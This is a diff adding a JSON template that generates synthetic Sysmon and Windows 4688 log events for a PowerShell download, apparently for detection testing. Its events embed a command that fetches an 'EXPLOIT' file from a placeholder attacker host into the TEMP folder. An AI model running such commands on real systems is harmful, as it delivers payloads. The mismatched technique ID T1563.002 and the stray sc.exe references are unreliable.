@@ -1,0 +1,240 @@
+{
+  "template_name": "Poweshell file download",
+  "technique": "T1563.002",
+  "description": "Preuzimanje datoteke koristeći Powershell.",
+  "version": "1.0",
+  "created_at": "2026-08-26T00:00:00Z",
+  "machines": ["target", "attacker"],
+  "logs": [
+    {
+      "id": 0,
+      "description": "Sysmon događaj 1: pokretanje PowerShell procesa za preuzimanje datoteke s udaljene lokacije.",
+      "log_source": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+      "hostname": "{{COMPUTERNAME:target}}",
+      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='{{TIMESTAMP:SYSTEMTIME}}'/><EventRecordID>{{EVENTRECORDID:target+GSEQ(XmlWinEventLog:Microsoft-Windows-Sysmon/Operational)}}</EventRecordID><Correlation/><Execution ProcessID='{{PID:target:EVENT_PID_SYSMON+RAND[100,65532,4]}}' ThreadID='{{THREADID:target+RAND[100,65532,4]}}'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>{{COMPUTERNAME:target}}.{{USERDNSDOMAIN:target}}</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>{{RULENAME:target}}</Data><Data Name='UtcTime'>{{TIMESTAMP:UTCTIME+12733}}</Data><Data Name='ProcessGuid'>{{PROCESSGUID:target:POWERSHELL}}</Data><Data Name='ProcessId'>{{PID:target:POWERSHELL+RAND[100,65532,4]}}</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='FileVersion'>{{FILEVERSION:target:POWERSHELL}}</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" &amp; {(New-Object System.Net.WebClient).DownloadFile(\\\"{{REMOTELINK:attacker}}\\\", \\\"$env:TEMP\\{{FILENAME:target:EXPLOIT}}\\\")} </Data><Data Name='CurrentDirectory'>{{DIRECTORY:target:EXECUTION}}</Data><Data Name='User'>{{USERDOMAIN:target}}\\{{USERNAME:target:LOCAL}}</Data><Data Name='LogonGuid'>{{LOGONGUID:target}}</Data><Data Name='LogonId'>{{LOGONID:target}}</Data><Data Name='TerminalSessionId'>{{TERMINALSESSIONID:target}}</Data><Data Name='IntegrityLevel'>{{INTEGRITYLEVEL:target}}</Data><Data Name='Hashes'>MD5={{MD5HASH:target:POWERSHELL}},SHA256={{SHA256HASH:target:POWERSHELL}},IMPHASH={{IMPHASH:target:POWERSHELL}}</Data><Data Name='ParentProcessGuid'>{{PROCESSGUID:target:POWERSHELL_PARENT}}</Data><Data Name='ParentProcessId'>{{PID:target:POWERSHELL_PARENT+RAND[100,65532,4]}}</Data><Data Name='ParentImage'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='ParentCommandLine'>\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" </Data></EventData></Event>"
+    },
+    {
+      "id": 1,
+      "description": "Sysmon događaj 11: stvaranje datoteke preuzete putem PowerShella u privremenom direktoriju.",
+      "log_source": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+      "hostname": "{{COMPUTERNAME:target}}",
+      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='{{TIMESTAMP:SYSTEMTIME+273825}}'/><EventRecordID>{{EVENTRECORDID:target+GSEQ(XmlWinEventLog:Microsoft-Windows-Sysmon/Operational)}}</EventRecordID><Correlation/><Execution ProcessID='{{PID:target:EVENT_PID_SYSMON+RAND[100,65532,4]}}' ThreadID='{{THREADID:target+RAND[100,65532,4]}}'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>{{COMPUTERNAME:target}}.{{USERDNSDOMAIN:target}}</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>{{RULENAME:target}}</Data><Data Name='UtcTime'>{{TIMESTAMP:UTCTIME+273267}}</Data><Data Name='ProcessGuid'>{{PROCESSGUID:target:POWERSHELL}}</Data><Data Name='ProcessId'>{{PID:target:POWERSHELL+RAND[100,65532,4]}}</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='TargetFilename'>{{DIRECTORY:target:TEMP}}{{FILENAME:target:EXPLOIT}}</Data><Data Name='CreationUtcTime'>{{TIMESTAMP:UTCTIME+273200}}</Data></EventData></Event>"
+    } ,
+    {
+      "id": 10,
+      "description": "Windows Security događaj 4688 na ciljanom računalu: stvaranje novog PowerShell procesa (Process Creation auditing).",
+      "log_source": "WinEventLog:Security",
+      "hostname": "{{COMPUTERNAME:target}}",
+      "raw": "{{TIMESTAMP:US_LOCALE+68}}\nLogName=Security\nSourceName=Microsoft Windows security auditing.\nEventCode=4688\nEventType=0\nType=Information\nComputerName={{COMPUTERNAME:target}}.{{USERDNSDOMAIN:target}}\nTaskCategory=Process Creation\nOpCode=Info\nRecordNumber={{EVENTRECORDID:target+GSEQ(WinEventLog:Security)}}\nKeywords=Audit Success\nMessage=A new process has been created.\nCreator Subject:\n\tSecurity ID:\t\t{{USERDOMAIN:target}}\\{{USERNAME:target:LOCAL}}\n\tAccount Name:\t\t{{USERNAME:target:LOCAL}}\n\tAccount Domain:\t\t{{USERDOMAIN:target}}\n\tLogon ID:\t\t{{LOGONID:target}}\nTarget Subject:\n\tSecurity ID:\t\tNULL SID\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\nProcess Information:\n\tNew Process ID:\t\t{{PID:target:POWERSHELL+RAND[100,65532,4]}}\n\tNew Process Name:\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tToken Elevation Type:\t{{TOKENELEVATIONTYPE:target}}\n\tMandatory Label:\t\t{{INTEGRITYLEVEL:target}}\n\tCreator Process ID:\t\"{{PID:target:POWERSHELL_PARENT+RAND[100,65532,4]}}\"\n\tCreator Process Name:\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tProcess Command Line:\t\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {(New-Object System.Net.WebClient).DownloadFile(\\\"{{REMOTELINK:attacker}}\\\", \\\"$env:TEMP\\{{FILENAME:target:EXPLOIT}}\\\")} \nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+    } 
+  ],
+  "parameters": [
+    {
+      "name": "CommandLine / Process Command Line",
+      "description": "Korištenje PowerShellove funkcionalnosti .NET WebClient za preuzimanje datoteke putem HTTPS-a s željene stranice i njezino lokalno spremanje u korisničku TEMP mapu.",
+      "placeholders": [
+        "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" &amp; {(New-Object System.Net.WebClient).DownloadFile(\\\"\"{{REMOTELINK:attacker}}\\\"\", \\\"\"$env:TEMP\\{{FILENAME:target:EXPLOIT}}\\\"\")}"
+      ]
+    },
+    {
+      "name": "Computer",
+      "description": "Naziv hosta računala koje je generiralo Windows Security/Sysmon događaje.",
+      "placeholders": [
+        "{{COMPUTERNAME:target}}.{{USERDNSDOMAIN:target}}"
+      ]
+    },
+    {
+      "name": "Creator Process ID",
+      "description": "PID nadređenog procesa koji je pokrenuo naredbu, hexadekadski zapis, vrijednost kao ParentProcessId.",
+      "placeholders": [
+        "{{PID:target:POWERSHELL_PARENT+RAND[100,65532,4]}}"
+      ]
+    },
+    {
+      "name": "CreationUtcTime",
+      "description": "Vremenaska vrijednost stvaranja datoteke po onome što piše u njenim metapodatcima.",
+      "placeholders": [
+        "{{TIMESTAMP:UTCTIME+273200}}"
+      ]
+    },
+    {
+      "name": "CurrentDirectory",
+      "description": "Radni direktorij tijekom pokretanja procesa, ujedno pokazuje profil korisnika (samo Sysmon logovi).",
+      "placeholders": [
+        "{{DIRECTORY:target:EXECUTION}}"
+      ]
+    },
+    {
+      "name": "EventRecordID/RecordNumber",
+      "description": "ID događaja, automatski raste za svaku pojavu unutar scenarija (+GSEQ) za svaki kanal zapisa, počevši od bazne vrijednosti iz topologije. Postoje 2 zasebna brojača (role): LOCAL_SECURITY i REMOTE_SECURITY dijele kanal XmlWinEventLog:Security, REMOTE_SYSMON i LOCALE_SYSMON dijele kanal XmlWinEventLog:Microsoft-Windows-Sysmon/Operational - no svaka od 4 role i dalje ima svoj vlastiti zaseban brojac, kanal je samo oznaka izvora.",
+      "placeholders": [
+        "{{EVENTRECORDID:target+GSEQ(WinEventLog:Security)}}",
+        "{{EVENTRECORDID:target+GSEQ(XmlWinEventLog:Microsoft-Windows-Sysmon/Operational)}}"
+      ]
+    },
+    {
+      "name": "FileVersion",
+      "description": "Podaci o verziji pokrenute izvršne datoteke.",
+      "placeholders": [
+        "{{FILEVERSION:target:POWERSHELL}}"
+      ]
+    },
+    {
+      "name": "Hashes",
+      "description": "Kriptografski sažetak (MD5, SHA256 i IMPHASH) izvršne datoteke koja je pokrenuta.",
+      "placeholders": [
+        "MD5={{MD5HASH:target:POWERSHELL}},SHA256={{SHA256HASH:target:POWERSHELL}},IMPHASH={{IMPHASH:target:POWERSHELL}}"
+      ]
+    },
+    {
+      "name": "IntegrityLevel",
+      "description": "Razina privilegija tijekom kreiranje procesa. Medium za obične korisnike, High za administratore.",
+      "placeholders": [
+        "{{INTEGRITYLEVEL:target}}"
+      ]
+    },
+    {
+      "name": "LogonGuid",
+      "description": "GUID koji jedinstveno identificira logon sesiju (samo Sysmon logovi). Isti GUID pojavljuje se u logovima iz iste sesije.",
+      "placeholders": [
+        "{{LOGONGUID:target}}"
+      ]
+    },
+    {
+      "name": "LogonId",
+      "description": "Hex ID logon sesije (samo Sysmon logovi). Odgovara SubjectLogonId u Security 4688 logovima iste sesije.",
+      "placeholders": [
+        "{{LOGONID:target}}"
+      ]
+    },
+    {
+      "name": "MandatoryLabel",
+      "description": "Razina integriteta dodijeljena novom procesu koja određuje njegovu razinu povjerenja i privilegija unutar Windows sustava. High ako je administrativan račun, Medium ako nije. Isto kao integrity lever.",
+      "placeholders": [
+        "{{INTEGRITYLEVEL:target}}"
+      ]
+    },
+    {
+      "name": "NewProcessId",
+      "description": "PID dodijeljen novo kreiranom procesu sc.exe (Security 4688 logovi). Dinamički dodijeljen tijekom postavljanja. Isti kao ProcessId eventa 1.",
+      "placeholders": [
+        "{{PID:target:POWERSHELL+RAND[100,65532,4]}}"
+      ]
+    },
+    {
+      "name": "ParentProcessGuid",
+      "description": "Sysmon GUID nadređenog procesa (POWERSHELL) za Sysmon logove.",
+      "placeholders": [
+        "{{PROCESSGUID:target:POWERSHELL_PARENT}}"
+      ]
+    },
+    {
+      "name": "ParentProcessId",
+      "description": "PID nadređenog procesa koji je pokrenuo naredbu.",
+      "placeholders": [
+        "{{PID:target:POWERSHELL_PARENT+RAND[100,65532,4]}}"
+      ]
+    },
+    {
+      "name": "ProcessGuid",
+      "description": "Sysmon GUID koji jedinstveno identificira svaku instancu novonastalog procesa, dinamički generiran.",
+      "placeholders": [
+        "{{PROCESSGUID:target:POWERSHELL}}"
+      ]
+    },
+    {
+      "name": "ProcessId",
+      "description": "Za Sysmon evente označava PID novo kreiranog procesa. Dinamički dodijeljen po izvršavanju.",
+      "placeholders": [
+        "{{PID:target:POWERSHELL+RAND[100,65532,4]}}"
+      ]
+    },
+    {
+      "name": "ProcessID",
+      "description": "ProcessID stvaranja samog zapisa u Execution elementu.",
+      "placeholders": [
+        "{{PID:target:EVENT_PID_SECURITY+RAND[100,65532,4]}}",
+        "{{PID:target:EVENT_PID_SYSMON+RAND[100,65532,4]}}"
+      ]
+    },
+    {
+      "name": "RuleName",
+      "description": "Polje koje se popuni kada Sysmon ima posebnu konfiguraciju koja se zbog napada aktivira.",
+      "placeholders": [
+        "{{RULENAME:target}}"
+      ]
+    },
+    {
+      "name": "SubjectDomainName",
+      "description": "NetBIOS naziv domene korisnika koji izvršava naredbu (Security 4688 logovi).",
+      "placeholders": [
+        "{{USERDOMAIN:target}}"
+      ]
+    },
+    {
+      "name": "SubjectLogonId",
+      "description": "Hex ID logon sesije (Security 4688 logovi). Ista vrijednost kroz sve logove koji dijele jednu sesiju, odgovara vrijednosti LogonId za Sysmon.",
+      "placeholders": [
+        "{{LOGONID:target}}"
+      ]
+    },
+    {
+      "name": "SubjectUserName",
+      "description": "Korisničko ime računa koji izvršava sc.exe naredbu.",
+      "placeholders": [
+        "{{USERNAME:target:LOCAL}}"
+      ]
+    },
+    {
+      "name": "Subject Security ID",
+      "description": "SID korisnika u formatu DOMENA\\Korisnik (Security 4688 logovi).",
+      "placeholders": [
+        "{{USERDOMAIN:target}}\\{{USERNAME:target:LOCAL}}"
+      ]
+    },
+    {
+      "name": "SystemTime / UtcTime",
+      "description": "Vremenska oznaka svakog događaja. Offset u mikrosekundama od baznog TIMESTAMPa. UtcTime označava vrijeme stvaranja.",
+      "placeholders": [
+        "{{TIMESTAMP:SYSTEMTIME}}",
+        "{{TIMESTAMP:SYSTEMTIME+OFFSET}}",
+        "{{TIMESTAMP:UTCTIME+OFFSET}}"
+      ]
+    },
+    {
+      "name": "TargetFilename",
+      "description": "Mjesto gdje se spremio exploit nakon njegovog nastanka. Nalazi se u temp direktoriju računala ($env:TEMP).",
+      "placeholders": [
+        "{{DIRECTORY:target:TEMP}}{{FILENAME:target:EXPLOIT}}"
+      ]
+    },
+    {
+      "name": "TerminalSessionId",
+      "description": "Identifikator sesije pod kojom je proces kreiran, za remote interactive je recimo najčešće 2.",
+      "placeholders": [
+        "{{TERMINALSESSIONID:target}}"
+      ]
+    },
+    {
+      "name": "ThreadID",
+      "description": "OS-dodijeljen thread identifier. Isti je za Sysmon ove zapise.",
+      "placeholders": [
+        "{{THREADID:target+RAND[100,65532,4]}}"
+      ]
+    },
+    {
+      "name": "Token Elevation Type",
+      "description": "Privilegije novog procesa, ovisi o korisniku koji ga je pokrenuo. Pogledati dokumentaciju za koji odabrati.",
+      "placeholders": [
+        "{{TOKENELEVATIONTYPE:target}}"
+      ]
+    },    
+    {
+      "name": "User",
+      "description": "Korisnički račun pod kojim je proces pokrenut.",
+      "placeholders": [
+        "{{USERDOMAIN:target}}\\{{USERNAME:target:LOCAL}}"
+      ]
+    }
+  ]
+}
